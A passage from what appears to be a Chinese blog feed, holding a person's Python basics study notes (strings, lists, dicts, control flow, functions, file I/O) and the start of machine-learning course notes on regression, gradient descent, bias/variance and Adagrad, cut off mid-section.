title="字符串"></a>字符串</h3><p>字符串必须用引号括起来，单引号双引号均可<br>资瓷转义字符<br>如果两个字符串紧挨着写在一起会自动拼接<br>数值和字符串拼接时，将数值转换成字符串的两个函数<code>str()</code>和<code>repr()</code>略有不同</p><p><code>input()</code>获得输入的时候总是返回一个字符串<br><code>raw_input()</code>是Python2.x提供的，相当于Python3.x的<code>input()</code></p><p>长字符串其实就是多行注释的方法，三个引号，允许使用<code>\</code>对换行符进行转义</p><p>原始字符串，也就是不进行转义的，<code>r&#39;G:\publish\code&#39;</code></p><p>字节串(bytes)：二进制保存数据<br>可以在字符串添加<code>b</code>来构造包含ASCII字符的字节串<br>可以调用<code>bytes()</code>函数来构造<br>可以用<code>encode()</code>方法转换，用<code>decode()</code>解码</p><h3 id="深入使用字符串"><a href="#深入使用字符串" class="headerlink" title="深入使用字符串"></a>深入使用字符串</h3><p>转义字符就不说了..</p><p>字符串格式化<br>用<code>%</code>做分隔符<br>Eg.<code>print(&quot;%s is a %d years old boy&quot;, %(user, age))</code><br>其他格式代表跟c/c++差不多，有个<code>r</code>是使用<code>repr()</code>转化，<code>s</code>是使用<code>str()</code>转换<br><code>-</code>指定左对齐，<code>+</code>指定带符号，<code>0</code>表示补充0</p><p>序列相关方法<br>整数表示正索引，负数表示负索引，也就是倒数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">3</span>: <span class="number">5</span>] <span class="comment"># 不包含索引5，这是一个左闭右开区间，留空就是倒两端</span></span><br><span class="line">s[<span class="number">3</span>: <span class="number">-5</span>] </span><br><span class="line">s[<span class="number">-6</span>: <span class="number">-3</span>]</span><br><span class="line">s[<span class="number">5</span>: ]</span><br><span class="line">s[: <span class="number">5</span>]</span><br></pre></td></tr></table></figure></p><p>支持<code>in</code>运算符查找子串<br>长度<code>len()</code>获取<br>用<code>max(),min()</code>获取最大和最小字符</p><p>大小写相关方法<br><code>title()</code>：每个单词首字母大写<br><code>lower()</code>：全部小写<br><code>upper()</code>：全部大写</p><p>删除空白<br><code>strip()</code>：删除字符串前后的空白<br><code>lstrip()</code>：删除左边空白<br><code>rstrip()</code>：删除右边空白</p><p>这些方法并不会真正修改字符串</p><p>查找、替换<br><code>startswith()</code>：判断字符串是否以指定子串开头<br><code>endswith()</code>：判断字符串你是否以指定子串结尾<br><code>find()</code>：查找子串出现的位置，未找到返回-1<br><code>index()</code>：查找子串出现的位置，未找到引发<code>ValueError</code>错误<br><code>replace()</code>：使用指定子串替换字符串的目标子串，第三个参数是替换次数，留空表示全部替换<br><code>translate()</code>：使用指定的翻译映射表对字符串执行替换<br>Python提供了一个<code>maketrans()</code>函数，有两个参数，前者是需要映射的所有字符，后者是映射后的所有字符</p><p>分割、连接<br><code>split()</code>：将字符串按指定分割符分割成多个短语，两个参数，第一个是分隔符，第二个是分成的部分数量<br><code>join()</code>：将多个短语连接成字符串，Eg.<code>&#39;,&#39;.join(list)</code></p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p><code>/</code>表示普通除法，<code>//</code>表示整除<br><code>%</code>求余运算可以不是整数<br>两个都不能除0，否则引发<code>ZeroDivisionError</code>错误<br>乘方运算<code>**</code>，也可以执行开方运算</p><p>索引运算符<br><code>[begin: end: step]</code>差不多这个样子</p><p>比较运算符与bool类型<br><code>is</code>要求两个变量引用同一个对象<br><code>id()</code>可以获得引用对象的地址</p><p>逻辑运算符<br><code>and, or, not</code></p><p>三目运算符<br><code>True_statements if expression else False_statements</code><br>先求<code>expression</code>，如果是<code>True</code>执行并返回<code>True_statements</code>的值，反之执行并返回<code>False_statements</code><br>允许使用多条语句，如果用逗号分割，每条都会执行，返回多条语句返回值组成的元组；如果用分号分割，每条购会执行，只返回第一条的返回值<br>支持嵌套</p><p><code>in</code>运算符判断是否位于序列，也有<code>not in</code></p><p>符号优先级表我就不写了…打括号就vans了</p><h2 id="列表、元组和字典"><a href="#列表、元组和字典" class="headerlink" title="列表、元组和字典"></a>列表、元组和字典</h2><h3 id="序列简介"><a href="#序列简介" class="headerlink" title="序列简介"></a>序列简介</h3><p>字符串、列表、元组<br>列表是可变的，元组是不可变的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建列表</span></span><br><span class="line">[ele1, ele2, ...]</span><br><span class="line"><span class="comment"># 创建元组</span></span><br><span class="line">(ele1, ele2, ...)</span><br></pre></td></tr></table></figure></p><p>通过索引可以访问元素</p><p>slice语法，左闭右开<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[start: end: step]</span><br></pre></td></tr></table></figure></p><p>加法<br>元组和列表不能相加，但是元组和元组、列表和列表可以相加</p><p>乘法<br>与整数相乘，将包含的元素重复$N$次<br>为了表示只有一个元素的元组，必须在唯一的元组元素之后添加英文逗号</p><p><code>in</code>运算符<br><code>len(),max(),min()</code>，比较大小必须相同类型且可比较大小</p><p>序列封包和序列解包<br>程序把多个值赋给同一个变量时，会自动将多个值封装成元组，叫做序列封包<br>程序允许将序列直接赋值给多个变量，各元素会依次赋值给每个变量（个数必须相等），称为序列解包<br>如果在变量之前添加<code>*</code>那么这个变量就代表一个列表</p><h3 id="使用列表"><a href="#使用列表" class="headerlink" title="使用列表"></a>使用列表</h3><p><code>list()</code>可以将元组或<code>range</code>对象转换成列表</p><p>类似的，用<code>tuple()</code>可以转换成元组</p><p>增加列表元素<br><code>append()</code>将参数追加到列表最后，可以是元组或列表形成嵌套<br><code>extend()</code>可以将参数依次追加到列表后面而不是当做一个整体<br><code>insert(index, ele)</code>从中间插入</p><p>删除列表元素<br><code>del</code>语句，Eg.<code>del a[2]</code><br>不仅可以删除列表还可以删除变量<br>列表的方法，<code>remove()</code>删除第一个找到的元素，<code>clear()</code>清空</p><p>修改列表元素<br>直接赋值，也可以用slice语法对部分赋值，不要求数量相等，也就是可以增加元素<br>如果用slice语法用字符串对列表赋值，那么会把字符当成一个元素，如果slice语法指定了step，那么个数必须相等</p><p>其他常用方法<br><code>dir(list)</code>可以查看所有方法<br><code>count()</code>： 统计某元素出现次数<br><code>index()</code>： 判断某元素出现位置<br><code>pop()</code>： 当成栈来使用，出栈<br><code>reverse()</code>： 将元素翻转<br><code>sort()</code>： 对元素排序，可以传入<code>key</code>和<code>reverse</code>两个参数，<code>key</code>是比较大小的键，<code>reverse</code>默认为<code>False</code>从小到大排序如果是<code>True</code>则从大到小排序</p><h3 id="使用字典"><a href="#使用字典" class="headerlink" title="使用字典"></a>使用字典</h3><p><code>key</code>和<code>value</code>的映射，需要通过<code>key</code>访问<code>value</code>，所以<code>key</code>不允许重复</p><p>创建字典<br>列表不能作为<code>key</code>,必须是不可变类型，元组可以<br>用<code>dict</code>创建列表时，列表中的每个元组被当成一个<code>key-value</code>，所以必须是两个元素<br>指定关键字参数创建字典，这是<code>key</code>不允许使用表达式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;key1: value1, key2: value2, ...&#125;</span><br><span class="line">dict(list)</span><br><span class="line">dict(chinese=1, jp=2)</span><br></pre></td></tr></table></figure></p><p>添加只需赋值即可，删除用<code>del</code>语句，<code>in</code>判断是否有指定<code>key</code></p><p>常见方法<code>dir(dict)</code><br><code>clear()</code>： 清空所有<code>key-value</code>对<br><code>get()</code>： 通过<code>key</code>获得<code>value</code>，访问不存在的不会引发<code>KeyError</code>错误，而是返回<code>None</code><br><code>update()</code>： 用一个字典更新另一个字典，可以添加和覆盖<br><code>items()</code>： 获得所有的<code>key-value</code>对<br><code>keys()</code>： 获得所有的<code>key</code><br><code>values()</code>： 获得所有的<code>value</code><br><code>pop()</code>： 获得<code>key</code>所对应的<code>value</code>并删除<br><code>popitem()</code>： 删除最后一个储存的<br><code>setdefault()</code>： 获得指定<code>key</code>的<code>value</code>，如果不存在则返回第二个参数也就是设置的默认值</p><p>使用字典格式化字符串<br>多参数时适用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'name: %(name)s, age: %(age)d, weight: %(weight).2f'</span></span><br><span class="line">d=&#123;<span class="string">'name'</span>: <span class="string">'beiyu'</span>, <span class="string">'age'</span>: <span class="number">19</span>, <span class="string">'weight'</span>: <span class="number">49.4</span>&#125;</span><br><span class="line">print(s % d) <span class="comment"># name: beiyu, age: 19, weight: 49.40</span></span><br></pre></td></tr></table></figure></p><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>严格缩进，缩进程度必须相同<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> expression :</span><br><span class="line">    statements...</span><br><span class="line"><span class="keyword">elif</span> expression :</span><br><span class="line">    statements...</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    statements</span><br></pre></td></tr></table></figure></p><p>不要忘记冒号！<br>还有以下会被认为是<code>False</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">False</span>, <span class="keyword">None</span>, <span class="number">0</span>, <span class="string">""</span>, (), [], &#123;&#125;</span><br></pre></td></tr></table></figure></p><p><code>pass</code>语句可以当占位使用</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p><code>assert expression</code>如果为True继续执行，否则引发<code>AssertionError</code>错误</p><h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3><p>while<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[init_statements]</span><br><span class="line"><span class="keyword">while</span> test_expression :</span><br><span class="line">    body_statements</span><br><span class="line">    [iteration_statements]</span><br></pre></td></tr></table></figure></p><p>for-in<br>用于遍历<br>循环变量受<code>for-in</code>控制，不应在循环体中进行赋值；用于可迭代对象，有<code>next()</code>方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> set|str|dict|list :</span><br><span class="line">    statements</span><br></pre></td></tr></table></figure></p><p><code>isinstance(var, type)</code>可以判断是否为指定类型</p><p>循环可以使用<code>else</code>，是循环条件不满足时执行的，不管是否进入循环</p><p><code>for</code>表达式<br>可以有多层，继续往后加<code>for</code>即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[表达式 <span class="keyword">for</span> 计数器 <span class="keyword">in</span> 可迭代对象]</span><br></pre></td></tr></table></figure></p><p><code>zip()</code>可以将多个列表压缩成一个<code>zip()</code>对象，长度不等取短的</p><h3 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h3><p><code>break,continue,return</code></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function_name</span><span class="params">(var1, var2, ...)</span> :</span></span><br><span class="line">    statements</span><br><span class="line">    <span class="keyword">return</span> [var]</span><br></pre></td></tr></table></figure><p>当函数体只有一行时，可以与函数头放在同一行</p><p>为函数添加文档<br>将一段注释内容放在声明后函数体前，就可以通过<code>help()</code>和函数的<code>__doc__</code>获得文档</p><p>传参<br>按位置，按关键字，可以设置参数默认值，带默认值的参数定义在形参后面</p><p>参数收集 个数可变参数<br>前面加<code>*</code>号，当做元组个数可变<br>前面加<code>**</code>，当做字典，关键字参数收集的参数</p><p>逆向参数收集<br>将已有列表、元组、字典拆开传给函数参数<br>在传入列表元组的参数之前加<code>*</code>，字典参数添加<code>**</code></p><p>参数传递机制<br>跟其他语言一样，传的是形参，列表元组字典传的是实参，可以修改</p><p>变量作用域<br><code>globals()</code>： 全局范围内所有变量组成的字典<br><code>locals()</code>： 当前局部范围<br><code>vars(object)</code>： 在指定对象范围内，若不传入<code>object</code>则跟<code>locals()</code>一样</p><p>在函数中声明全局变量，就是在变量名前加<code>global</code></p><h3 id="局部函数"><a href="#局部函数" class="headerlink" title="局部函数"></a>局部函数</h3><p>在函数体内定义函数，对外部是隐藏的，称为局部函数，只能在封闭函数中使用<br>封闭函数可以返回局部函数供其他作用域中使用，如果封闭函数将局部函数返回，且程序使用变量保存了封闭函数的返回值，那么这些局部函数的作用域就会被扩大</p><p>可以使用<code>nonlocal</code>生命访问赋值语句只是访问该函数所在函数内的局部变量</p><h3 id="函数高级内容"><a href="#函数高级内容" class="headerlink" title="函数高级内容"></a>函数高级内容</h3><p>函数变量，相当于起别名，也可以当做返回值、形参</p><h3 id="局部函数与lambda表达式"><a href="#局部函数与lambda表达式" class="headerlink" title="局部函数与lambda表达式"></a>局部函数与lambda表达式</h3><p>lambda表达式只能是单行表达式<br>语法<br><code>lambda [parameter_list]: 表达式</code></p><p><code>map()</code>函数<br>第一个参数是需要传入的函数，第二个参数是数据</p><p><del>到这里，基本的语法已经看完了，剩下就是类还有些比较高级的东西了，抽空看</del><br><del>我错了，再补充下文件的部分…</del><br>算了…先看下基本的文件操作就可以了，详细的以后再说吧..</p><h2 id="文件-I-O"><a href="#文件-I-O" class="headerlink" title="文件 I/O"></a>文件 I/O</h2><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(file_name [, access_mode][, buffering])</span><br></pre></td></tr></table></figure><p><code>file.closed</code>： 返回文件是否已经关闭<br><code>file.mode</code>： 返回打开文件的访问模式<br><code>file.name</code>： 返回打开文件的文件名称</p><p>打开模式<br><code>r</code>： 只读<br><code>w</code>： 写<br><code>a</code>： 追加<br><code>+</code>： 读写<br><code>b</code>： 二进制模式</p><p>缓冲<br>如果<code>open</code>第三个参数为<code>0 or False</code>那么就不带缓冲，如果是<code>1 or True</code>就带缓冲</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p><code>read()</code>如果读入是<code>b</code>模式则读入字节，否则是字符，<code>read()</code>的参数表示一次读取多少字节或字符</p><p>按行读取<br><code>readline([n])</code>： 读取$n$行内容<br><code>readlines()</code>： 读取所有行</p><h2 id="csv库"><a href="#csv库" class="headerlink" title="csv库"></a>csv库</h2><p><a href="https://docs.python.org/zh-cn/3/library/csv.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/csv.html</a></p><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《疯狂Python讲义》，李刚.—北京：电子工业出版社，2019.1</li><li><a href="https://github.com/jackfrued/Python-100-Days/" target="_blank" rel="noopener">https://github.com/jackfrued/Python-100-Days/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记</title>
      <link href="/blog/note-machine-learning/"/>
      <url>/blog/note-machine-learning/</url>
      
        <content type="html"><![CDATA[<p>暑假不定时更新ing…<br>写好的笔记可能不会立刻同步…可能大部分放英文，小部分中文翻译</p><hr><h2 id="Overview-amp-Learning-Map"><a href="#Overview-amp-Learning-Map" class="headerlink" title="Overview &amp; Learning Map"></a>Overview &amp; Learning Map</h2><p>supervised learning</p><ul><li>regression</li><li>classification<ul><li>linear model</li><li>non-linear model<ul><li>deep learning</li><li>SVM, decision tree, K-NN…</li></ul></li></ul></li><li>structured learning</li></ul><p>semi-supervised learning<br>transfer learning<br>unsupervised learning<br>reinforcement learning<br>这些根据scenario的不同选择的</p><h2 id="The-Next-Step-for-Machine-Learning"><a href="#The-Next-Step-for-Machine-Learning" class="headerlink" title="The Next Step for Machine Learning"></a>The Next Step for Machine Learning</h2><ul><li>Anomaly Detection (让机器知道”我不知道“)</li><li>Explainable AI (为什么知道)</li><li>防止 Adversarial Attack</li><li>Life-long Learning</li><li>Meta-learning / Learn to learn</li><li>Few-shot / Zero-shot Learning</li><li>增强式学习</li><li>Network Compression</li><li>如果训练资料和测试资料很不一样</li></ul><h2 id="Regression"><a href="#Regression" class="headerlink" title="Regression"></a>Regression</h2><h3 id="Step1-Model-模型"><a href="#Step1-Model-模型" class="headerlink" title="Step1: Model 模型"></a>Step1: Model 模型</h3><p>首先要有一个Model，也就是一个Function Set，存各种各样的函数。<br>像$y=b+\sum w_ix_i$这种模型，就是一个Linear Model 线性模型<br>$x_i$表示attribute of input x，也就是$x$的各种属性feature 特征<br>$w_i$表示weight权重<br>$b$表示bias偏差</p><h3 id="Step2-Goodness-of-Function"><a href="#Step2-Goodness-of-Function" class="headerlink" title="Step2: Goodness of Function"></a>Step2: Goodness of Function</h3><p>接下来就是训练模型，选出一个较好的Function<br>首先要有Training Data，用hat表示正确的数据也就是$\hat{y}$<br>然后有另一个Function，也就是Loss Function，$L$来评价来估价，例如用平方差估价<br>$L(f)=L(w,b)=\sum_{n}(\hat{y}^n-(b+w\cdot x^n_{cp}))^2$，得到Estimation Error 估测误差，以下便用这个函数估价</p><h3 id="Step3-Best-Function"><a href="#Step3-Best-Function" class="headerlink" title="Step3: Best Function"></a>Step3: Best Function</h3><p>Pick the “Best” Function, $f^{\ast}=arg \min L(f) $ 或 $w^{\ast},b^{\ast}=arg \min L(w,b) $<br>在这个问题求解的地方<br>用到了Gradient Descent 梯度下降的方法</p><h3 id="Gradient-Descent"><a href="#Gradient-Descent" class="headerlink" title="Gradient Descent"></a>Gradient Descent</h3><p>首先必须是一个可微分的方程，先假设只有一个参数$L(w)$，那我们要求的就是$w^{\ast}=arg\min_{w}L(w)$，步骤如下：<br>随机选取或稍微优化选取一个初始解$w^{0}$<br>然后计算$\left . \frac{\text{d}L}{\text{d}w} \right |_ {w=w^{0}}$<br>显然$\left . \frac{\text{d}L}{\text{d}w} \right |_ {w=w^{0}}$为负，那么右边高损失大，左边低损失小<br>那么就让$w^{n}=w^{n-1}-\eta \left . \frac{\text{d}L}{\text{d}w} \right |_ {w=w^{n-1}}$<br>这里$\eta$表示Learning rate，$\eta$越大学习效率越高<br>然后多次迭代，最后显然是会得到一个Local optimal 局部最优解，也就是导数为零的时候，但不一定是Global optimal 全局最优解。</p><p>如果有两个参数$w^{\ast},b^{\ast}=arg \min L(w,b) $，步骤也差不多，求偏微分就是了<br>$w^{n}=w^{n-1}-\eta \left . \frac{\partial L}{\partial w}\right |_ {w=w^{n-1},b=b^{n-1}},b^{n}=b^{n-1}-\eta \left . \frac{\partial L}{\partial b}\right |_ {w=w^{n-1},b=b^{n-1}}$<br>那么Gradient就是$\triangledown L=\begin{bmatrix}\frac{\partial L}{\partial w}\\ \frac{\partial L}{\partial b}\end{bmatrix}_ {gradient}$<br>刚学过偏微分的我还是知道$(-\eta \frac{\partial L}{\partial w},-\eta \frac{\partial L}{\partial b})$的方向，对$L$的微分最大，也是空间的法线方向</p><p>在这里没有局部最优解，因为我们定义的函数是convex 凸的，只有全局最优解</p><h3 id="Generalization"><a href="#Generalization" class="headerlink" title="Generalization"></a>Generalization</h3><p>我们这样可以得到$w,b$，而我们关心的不是训练数据里的损失值，而是Testing Data 测试数据中的数据。</p><h3 id="Model-Selection"><a href="#Model-Selection" class="headerlink" title="Model Selection"></a>Model Selection</h3><p>我们想要得到更准确的数据呢，就需要复杂的Model，比如增加三次方，四次方，五次方之类的<br>A more complex model does not always lead to better performance on testing data. This is Overfitting.<br>但是复杂的Model在Training Data上的结果很好，但是在Testing Data上的结果较差，这就是Overfitting 过拟合。</p><h3 id="Redesign-the-Model"><a href="#Redesign-the-Model" class="headerlink" title="Redesign the Model"></a>Redesign the Model</h3><p>这时候还会有一个情况，那就是其他隐藏的参数，那就需要重新设计Model<br>如果是Pokemon的物种，那么就需要if来判断，用$\delta(x_s=x_0)$这个函数来将原函数改写成线性模型，函数值就是里面的等式成立是1不成立就是0</p><h3 id="Regularization"><a href="#Regularization" class="headerlink" title="Regularization"></a>Regularization</h3><p>就是修改Loss Function<br>$L=\sum_{n}(\hat{y}^n-(b+\sum w_ix_i))^2+\lambda (w_i)^2$，这里也就是我们希望参数越小越好，这里也是不需要$b$也就是bias的。<br>如果输入加上一点点变化，我们希望输出不那么参数小也就是输出对输入不那么敏感 sensitive，也就是比较smooth 平滑的。<br>If some noises corrupt input $x_i$ when testing. A smoother function has less influence.<br>Training error: larger $\lambda$, considering the training error less.<br>We prefer smooth function, but don’t be too smooth. </p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>最后有一个Demo，就是实际操作的时候可能不太好选取Learning Rate也就是$\eta$，用了一个AdaGrad，并对$w,b$分别设置了Learning rate。</p><h2 id="Bias-and-Variance"><a href="#Bias-and-Variance" class="headerlink" title="Bias and Variance"></a>Bias and Variance</h2><h3 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h3><p>Error due to “bias” and “variance”.</p><h3 id="Estimator"><a href="#Estimator" class="headerlink" title="Estimator"></a>Estimator</h3><p>举个栗子，如果要估测$x$的mean 平均值<br>assume the mean of $x$ is $\mu$<br>assume the variance of $x$ is $\sigma^2$</p><p>那么我们估测平均值$\mu$就随机取$N$个点来计算<br>$m=\frac{1}{N}\sum_{n}x^n\neq \mu$<br>$E[m]=E[\frac{1}{N}\sum_{n}x^n]=\frac{1}{N}\sum_{n}E[x^n]=\mu$，$m$的期望就是$\mu$，这个是unbiased的<br>$Var[m]=\frac{\sigma^2}{N}$，这个Variance depends on the number of samples，如果数量较多那么就会比较集中，如果较少那么就会比较分散了</p><p>如果估测variance $\sigma^2$<br>$m=\frac{1}{N}\sum_{n}x^n\neq \mu,s^2=\frac{1}{N}\sum_{n}(x^n-m)^2$<br>这里这个$s^2$是biased的，$E[s^2]=\frac{N-1}{N}\sigma^2$</p><h3 id="Variance"><a href="#Variance" class="headerlink" title="Variance"></a>Variance</h3><p>如果$E[f^{\ast}]=\bar{f}$，那么这个$\bar{f}$和中心店偏移的距离就是bias，而其他$f$和$\bar{f}$分散的距离就是variance<br>Model 比较简单那么可能获得一个Small Variance的情况，而比较复杂的Model 可能得到一个Large Variance<br>因为比较简单的Model受数据的影响较小</p><h3 id="Bias"><a href="#Bias" class="headerlink" title="Bias"></a>Bias</h3><p>$E[f^{\ast}]=\bar{f}$<br>Bias: If we average all the $f^{\ast}$, is it close to $\hat{f}$<br>然而一个简单的Model会有比较大的Bias，而比较复杂的Model便有一个小的Bias。</p><p>当你的function set的space比较小Model简单，那么它可能不包含target；Model复杂时，function set 的space也变大，就有可能包含target。</p><p>我们所得到的Error就是这两个造成的Error的和<br>如果Error在Bias较小Variance较大的地方就是Overfitting，如果Error在Bias较大Variance较小的地方就是Underfitting 欠拟合</p><h3 id="Large-Bias"><a href="#Large-Bias" class="headerlink" title="Large Bias"></a>Large Bias</h3><p>Diagnosis：</p><ul><li>If your model cannot even fit the training examples, then you have large bias.</li><li>If you can fit the training data, but large error on testing data, then you probably have large variance</li></ul><p>For bias, redesign your model:</p><ul><li>Add more features as input.</li><li>A more complex model.</li></ul><h3 id="Large-variance"><a href="#Large-variance" class="headerlink" title="Large variance"></a>Large variance</h3><ul><li><p>More data<br>这个可以自己生成许多训练数据</p></li><li><p>Regularization<br>这时调整了function space，可能会影响到bias，需要调整weight来取得平衡</p></li></ul><h3 id="Model-Selection-1"><a href="#Model-Selection-1" class="headerlink" title="Model Selection"></a>Model Selection</h3><ul><li>There is usually a trade-off between bias and variance.</li><li><p>Select a model that balances two kinds of error to minimize total</p></li><li><p>Cross Validation<br>将Training Set分成Training Set和Validation Set，然后用Validation Set来选择Model</p></li></ul><p>如果你把Public Testing Set考虑进去来修改那么就考虑进去了Public Testing Set的bias…</p><ul><li>N-fold Cross Validation<br>分成多份，将其中一份当成Validation Set</li></ul><h2 id="Gradient-Descent-1"><a href="#Gradient-Descent-1" class="headerlink" title="Gradient Descent"></a>Gradient Descent</h2><p>可以把参数写成向量的形式<br>那么${\theta}^{\ast}=arg\min_{\theta}L(\theta)$<br>Gradient:$\triangledown L=\begin{bmatrix}\frac{\partial L(\theta_1)}{\partial \theta_1}\\ \frac{\partial L(\theta_2)}{\partial \theta_2}\end{bmatrix}$<br>$\theta^{n}=\theta^{n-1}-\eta \triangledown L(\theta^{n-1})$</p><h3 id="Tip-1-Tuning-your-learning-rate"><a href="#Tip-1-Tuning-your-learning-rate" class="headerlink" title="Tip 1: Tuning your learning rate"></a>Tip 1: Tuning your learning rate</h3><p>Adaptive Learning Rates</p><ul><li>Popular &amp; Simple Idea: Reduce the learning rate by some factor every few epochs.<br>就是说经过几次计算后越来越接近最优解，就要调小Learning Rate，比如$\eta^t=\eta/\sqrt{t+1}$这个压子</li><li>Learning rate cannot be one-size-fits-all<br>Give different parameters different learning rates.</li></ul><h3 id="Adagrad"><a href="#Adagrad" class="headerlink" title="Adagrad"></a>Adagrad</h3><ul><li>Divide the learning rate of each parameter by the root mean square the its previous derivatives.<br>Adagrad: $w^{t+1}=w^{t}-\frac{\eta^{t}}{\sigma^{t}}g^{t},\sigma^{t}=\sqrt{\frac{1}{t+1}\sum_{i=0}^{t}(g^{i})^2},\eta^t=\eta/\sqrt{t+1}$<br>$\sigma^{t}$：root mean square of the previous derivatives of parameter w，就是前面所有的微分的平方的平均值再开根号<br>约分一下得到$w^{t+1}=w^{t}-\frac{\eta}{\sqrt{\sum_{i=0}^{t}(g^{i})^2}}g^{t}$</li></ul><p>Adagrad呢，上面$g^{t}$越大，变化越大，而下面的$\sqrt{\sum_{i=0}^{t}(g^{i})^2}$，会导致$g^{t}$越大，变化越小<br>Adagrad就是强调一个反差，how suprise it is，下面的考虑的是估计一下二次微分</p><p>考虑多个参数时，$g^t$越大，Gradient Descent不一定越大</p><h3 id="Tip-2-Stochastic-Gradient-Descent"><a href="#Tip-2-Stochastic-Gradient-Descent" class="headerlink" title="Tip 2: Stochastic Gradient Descent"></a>Tip 2: Stochastic Gradient Descent</h3><p>Loss函数$L=\sum_{n}\left (\hat{y}^n-(b+\sum w_ix_i^n) \right )^2$<br>这里要做的就是随机一个$x^n$，$L=\left (\hat{y}^n-(b+\sum w_ix_i^n) \right )^2,\theta^i=\theta^{i-1}-\eta \triangledown L^n(\theta^{i-1})$<br>有一个Sample就更新一下参数这个样子</p><h3 id="Tip-3-Feature-Scaling"><a href="#Tip-3-Feature-Scaling" class="headerlink" title="Tip 3: Feature Scaling"></a>Tip 3: Feature Scaling</h3><p>Make different features have the same scaling.<br>常见做法：<br>$R$个向量组$x^i$，For each dimension $i$，都算mean: $m_i$,standard deviation: $\sigma_i$<br>对第$r$个向量组$x^r$，$x_i^r=\frac{x_i^r-m_i}{\sigma_i}$，这样做完之后呢，所有的mean 会变成0，standard deviation 会变成1</p><h3 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h3><p>Taylor Series<br>理论主要是泰勒展开这个样子，大于等于二次项全部略去，然后相当于在一个圆圈中找一个向量与一次导数组成的向量内积最小，也就是一次导数组成的向量的反方向，再乘上一个常数指到圆圈边界，就得到了Gradient Descent的形式<br>这也就可以解释Learning Rate设置不对的时候偏差较大的问题</p><p>More Limitation of Gradient Descent<br>会Stuck at Local minimum or saddle point<br>Very slow at the plateau</p><h2 id="Classification-Probabilistic-Generative-Model"><a href="#Classification-Probabilistic-Generative-Model" class="headerlink" title="Classification: Probabilistic Generative Model"></a>Classification: Probabilistic Generative Model</h2><h3 id="Ideal-Alternatives"><a href="#Ideal-Alternatives" class="headerlink" title="Ideal Alternatives"></a>Ideal Alternatives</h3><p>Function(Model): x-&gt;f(x):g(x)&gt;0?class=1:class2<br>Loss function: $L(f)=\sum_{n}\delta (f(x^n)\neq \hat{y}^n)$, The number of times f get incorrect results on training data<br>Find the best function: Perceptron, SVN</p><h3 id="Generative-model"><a href="#Generative-model" class="headerlink" title="Generative model"></a>Generative model</h3><p>$P(C_1|x)=\frac{P(x|C_1)P(C_1)}{P(x|C_1)P(C_1)+P(x|C_2)P(C_2)}$<br>$P(x)=P(x|C_1)P(C_1)+P(x|C_2)P(C_2)$</p><h3 id="Prior"><a href="#Prior" class="headerlink" title="Prior"></a>Prior</h3><p>Assume the points are sampled from a Gaussian distribution.<br>Find the Gaussion distribution behind them</p><ul><li>Gaussian Distribution:<br>$f_{\mu,\Sigma}(x)=\frac{1}{(2\pi)^{D/2}}\frac{1}{|\Sigma|^{1/2}}\exp\{-\frac{1}{2}(x-\mu)^{T}\Sigma^{-1}(x-\mu)\}$<br>Input: vector x, output: probability of sampling x<br>The shape of the function determines by mean $\mu$ and convariance matrix $\Sigma$<br>这部分有空可以再详细看下</li></ul><p>How to find $\mu$ and $\Sigma$ ?</p><ul><li>Maximum 